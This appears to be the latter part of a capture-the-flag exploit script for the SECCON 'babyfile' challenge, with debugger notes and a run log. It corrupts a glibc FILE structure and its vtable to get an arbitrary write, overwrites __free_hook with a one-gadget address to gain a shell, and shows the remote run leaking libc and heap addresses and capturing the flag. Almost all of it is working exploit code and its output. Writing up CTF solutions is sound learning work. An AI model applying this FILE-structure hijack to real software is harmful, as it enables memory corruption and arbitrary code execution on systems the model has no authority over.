    # Change tactis: create arbitrary memory write and overwrite free/malloc hooks in libc!
    # when scanf is called:
    #    f 1   0x7ffff7e3fb9f _IO_file_underflow+383
    #    f 2   0x7ffff7e40f86 _IO_default_uflow+54
    #    f 3   0x7ffff7e13280 __vfscanf_internal+2176
    #    f 4   0x7ffff7e12162 __isoc99_scanf+178

    # set fp.vtable = _IO_file_read-0x60
    """
    pwndbg> p _IO_file_read
    $4 = {ssize_t (FILE *, void *, ssize_t)} 0x7ffff7e3e5a0 <__GI__IO_file_read>
    pwndbg> search -p &_IO_file_read
    Searching for value: b'\xa0\xe5\xe3\xf7\xff\x7f\x00\x00'
    libc-2.31.so    0x7ffff7f97b50 0x7ffff7e3e5a0
    pwndbg> xinfo 0x7ffff7f97b50
    Extended information for virtual address 0x7ffff7f97b50:

      Containing mapping:
        0x7ffff7f97000     0x7ffff7f9b000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so

      Offset information:
             Mapped Area 0x7ffff7f97b50 = 0x7ffff7f97000 + 0xb50
             File (Base) 0x7ffff7f97b50 = 0x7ffff7daf000 + 0x1e8b50
    """
    #write(0, b'a'*255)
    #exit()
    #io.interactive()

    # &_IO_default_pbackfail
    # pause()

    #define _IO_IN_BACKUP         0x0100
    flags = 0xfbad24a8 | 0x1000
    write(0, p32(flags))

    # 532:#define _IO_have_backup(fp) ((fp)->_IO_save_base != NULL)

    """
   985 	  if (fp->_IO_read_ptr > fp->_IO_read_base && _IO_have_backup (fp))
   986 	    {
   987 	      if (save_for_backup (fp, fp->_IO_read_ptr))
   988 		return EOF;
   989 	    }

    /*      8      |       8 */    char *_IO_read_ptr;
    /*     16      |       8 */    char *_IO_read_end;
    /*     24      |       8 */    char *_IO_read_base;
    pwndbg> p fp->_IO_read_ptr
    $7 = 0x555555559480 ""
    pwndbg> p fp->_IO_read_base
    $8 = 0x555555559480 ""

    pwndbg> ptype /o struct _IO_marker
/* offset      |    size */  type = struct _IO_marker {
/*      0      |       8 */    struct _IO_marker *_next;
/*      8      |       8 */    FILE *_sbuf;
/*     16      |       4 */    int _pos;
/* XXX  4-byte padding   */

                               /* total size (bytes):   24 */
                             }
    """
    free_hook_addr = libc_base+0x1eee48
    malloc_hook_addr = libc_base+0x1ecb70
    gadgets = [932606,932609,932612,933107,933110]
    gadget_ea = libc_base+gadgets[1]  #[int(args.I)]
    write(200, p64(gadget_ea))
    print("GADGET EA: %#x" % gadget_ea)

    copy_from = heap_base+0x368

    # fp->_IO_read_ptr > fp->_IO_read_base
    write(8, p64(copy_from+16))     # read_ptr
    write(16, p64(copy_from-16))    # read_end
    write(24, p64(copy_from))       # read_base
    #write(8, p8(0x90+8+24))

    # /*     96      |       8 */    struct _IO_marker *_markers;
    write(96, p64(heap_base)) # fp->_markers = heap_base 
    # Thx to that^ the least_mark in save_for_backup will be 0

    # /*     72      |       8 */    char *_IO_save_base;
    # /*     80      |       8 */    char *_IO_backup_base;
    # /*     88      |       8 */    char *_IO_save_end;
    # fp->_IO_save_end - fp->_IO_save_base
    write_to = free_hook_addr
    print("WRITE TO: %#x" % write_to)
    #copy_from = 0x42424242
    #write(72, p64(0x42424242))
    write(72, p64(write_to - 16))
    write(88, p64(write_to+32 - 16))

    new_vtable = libc_base + 0x1e9410 - 0x60
    write(216, p64(new_vtable))
    flush()

    #new_vtable = libc_base + 0x1e94a0 # reset to original vtable
    #write(216, p64(new_vtable))

    # &_IO_new_file_underflow calls free(fp->_IO_save_base)
    new_vtable = libc_base + 0x1e8a40 - 0x60
    write(216, p64(new_vtable))

    write(0, p32(0)) # set flags=0
    #/*     56      |       8 */    char *_IO_buf_base;
    #/*     64      |       8 */    char *_IO_buf_end;
    #/*     72      |       8 */    char *_IO_save_base;
    write(56, p64(0))
    write(72, p64(1))

    #/*      8      |       8 */    char *_IO_read_ptr;
    #/*     16      |       8 */    char *_IO_read_end;
    write(8, p64(0))
    write(16, p64(0))


    flush()

    """
         ► 0x7ffff7e40825 <save_for_backup+309>    call   *ABS*+0xa0950@plt                <*ABS*+0xa0950@plt>
        rdi: 0x7ffff7f9de48 (__free_hook) ◂— 0x0
        rsi: 0x555555559368 —▸ 0x7ffff7e92afe (execvpe+638) ◂— mov rdx, r12
        rdx: 0x10
        rcx: 0x0
    """

    io.interactive()

"""
root@CTF-ubuntu-s-1vcpu-1gb-intel-sgp1-01:~# python3 solv.py REMOTE I=1
[+] Opening connection to babyfile.seccon.games on port 3157: Done
Overwriting last vtable byte with = 0x88 to set fp.file->_IO_buf_base/end
Overwriting last vtable byte with = 0x60, to set all _IO_{read,write,buf,*} ptrs
Fixing vtable to its correct value
VTABLE PTR: 0x7f7b9041ef60
LIBC BASE : 0x7f7b90236000
HEAP BASE: 0x563ac6ddd000
FILE ADDR: 0x563ac6ddd2a0
GADGET EA: 0x7f7b90319b01
WRITE TO: 0x7f7b90424e48
[*] Switching to interactive mode
SECCON{r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3}
[*] Got EOF while reading in interactive
"""
